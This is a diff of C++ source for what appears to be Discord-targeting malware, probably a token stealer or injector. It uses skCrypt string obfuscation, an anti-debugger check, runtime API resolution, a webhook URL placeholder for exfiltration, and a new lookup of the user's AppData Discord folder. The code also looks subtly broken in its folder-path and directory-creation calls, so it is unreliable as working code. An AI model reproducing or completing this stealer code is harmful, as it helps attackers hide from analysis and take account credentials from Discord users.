@@ -8,6 +8,7 @@
 #include "resource.h"
 #include "injector.h"
 
+#include <shlobj.h>
 
 #define WEBHOOK_URL skCrypt("EXAMPLE_HOOK")
 
@@ -16,10 +17,11 @@ typedef BOOL(WINAPI* IsDebPresent)();
 typedef BOOL(WINAPI* ShowWindowCustom)(HWND hWnd, int nCmdShow);
 typedef HANDLE(WINAPI* pCreateFileMapping)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
 typedef void* (WINAPI* pMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
+typedef HRESULT(WINAPI* SHGETKNOWNFOLDERPATH)(REFKNOWNFOLDERID, DWORD, HANDLE, PWSTR);
 
 int main(int argc, char** argv) {
 	ShowWindowCustom ShowWindow = (ShowWindowCustom)GetProcAddress(GetModuleHandleA("user32.dll"), skCrypt("ShowWindow"));
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	ShowWindow(GetConsoleWindow(), SW_SHOW);
 
 	IsDebPresent isDebPresent = (IsDebPresent)GetProcAddress(GetModuleHandleA(skCrypt("kernel32.dll")), skCrypt("IsDebuggerPresent"));
 
@@ -104,7 +106,26 @@ int main(int argc, char** argv) {
 	}
 
 	manual::kernel32::init();
-	manual::kernel32::CreateDirectoryA();
+
+	SHGETKNOWNFOLDERPATH ShGetKnownFolderPath = (SHGETKNOWNFOLDERPATH)GetProcAddress(GetModuleHandleA(skCrypt("Shell32.dll")), "SHGetKnownFolderPath");
+
+	PWSTR szAppdata;
+	ShGetKnownFolderPath(FOLDERID_RoamingAppData, 0, nullptr, szAppdata);
+
+	std::wstring discord(szAppdata);
+	discord.append(skCrypt(L"/Discord/"));
+
+	std::wcout << discord << std::endl;
+
+	if (manual::kernel32::CreateDirectoryA(discord.c_str(), NULL)) {
+		std::cout << "Hello, World" << std::endl;
+		return 1;
+	}
+
+	if (GetLastError() != ERROR_ALREADY_EXISTS) {
+		std::cout << "Hello, World";
+		return 1;
+	}
 
 
 	HANDLE hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, nullptr, PAGE_READWRITE, 0, 1024, skCrypt("Local\\Microsoft"));
